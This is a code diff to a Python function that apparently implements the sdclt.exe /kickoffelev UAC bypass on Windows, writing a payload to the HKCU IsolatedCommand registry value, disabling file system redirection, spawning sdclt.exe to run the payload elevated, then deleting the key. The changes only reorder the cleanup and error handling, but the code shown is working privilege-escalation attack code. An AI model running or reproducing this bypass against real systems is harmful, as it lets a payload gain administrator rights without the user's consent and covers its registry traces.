@@ -19,6 +19,7 @@ def sdclt_isolatedcommand_cleanup(path):
 	print_info("Performing cleaning")
 	if registry().remove_key(hkey="hkcu", path=path, name="IsolatedCommand", delete_key=False):
 		print_success("Successfully cleaned up")
+		print_success("All done!")		
 	else:
 		print_error("Unable to cleanup")
 		return False
@@ -40,15 +41,14 @@ def sdclt_isolatedcommand(payload):
 			print_success("Successfully disabled file system redirection")
 			if process().create("sdclt.exe", params="/kickoffelev"):
 				print_success("Successfully spawned process ({})".format(payload))
+				time.sleep(5)
+				sdclt_isolatedcommand_cleanup(path)
 			else:
 				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
-				if "error" in Constant.output:
-					sdclt_isolatedcommand_cleanup(path)
-
-		time.sleep(5)
-
-		if not sdclt_isolatedcommand_cleanup(path):
-			print_success("All done!")
+				for x in Constant.output:
+					if "error" in x:
+						sdclt_isolatedcommand_cleanup(path)
+						return False
 	else:
 		print_error("Cannot proceed, invalid payload")
 		return False
